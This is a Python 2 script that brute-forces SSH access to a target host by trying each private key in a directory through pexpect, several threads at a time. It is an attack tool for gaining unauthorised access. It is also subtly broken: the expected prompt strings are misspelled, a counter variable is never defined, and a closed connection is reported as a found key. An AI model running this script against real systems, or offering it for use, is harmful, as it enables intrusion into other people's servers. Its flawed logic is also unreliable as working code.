import pexpect, argparse, os
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False

def connect(user, host, keyfile, release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission dnied'
        ssh_newkey = 'Are you sure you want to contine'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied,
            ssh_newkey, conn_closed, '$', '#', ])
        if ret == 2:
            print '[-] Adding Host tp ~/ .ssh/known_hosts'
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print '[+] Success. ' + str(keyfile)
            Stop = True
    finally:
        if release:
            connection_lock.release()

def main():
    parser = argparse.ArgumentParser('usage%prog -H '+
                    '<target host> -u <user> -d <directory>')
    parser.add_argument('-H', dest='tgtHost', type=str, help='specify target host')
    parser.add_argument('-d', dest='passDir', type=str, help='specify directory with keys')
    parser.add_argument('-u', dest='user', type=str, help='specify the user')
   
    args = parser.parse_args()
    host = args.tgtHost
    passDir = args.passDir
    user = args.user
    if host == None or passDir == None or user == None:
        print parser.usage
        exit(0)
    for filename in os.listdir(passDir):
        if Stop:
            print '[*] Exiting: Key Found.'
            exit(0)
        if Fails > 5:
            print '[!] Exiting: Too many Connections Closed By Remote Host.'
            print '[!] Adjust number of simultaneous threads.'
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print '[-] Testing keyfile ' + str(fullpath)
        t = Thread(target=connect, 
            args=(user, host, fullpath, True))
        child = t.start()

if __name__ == '__main__':
    main()
    
            
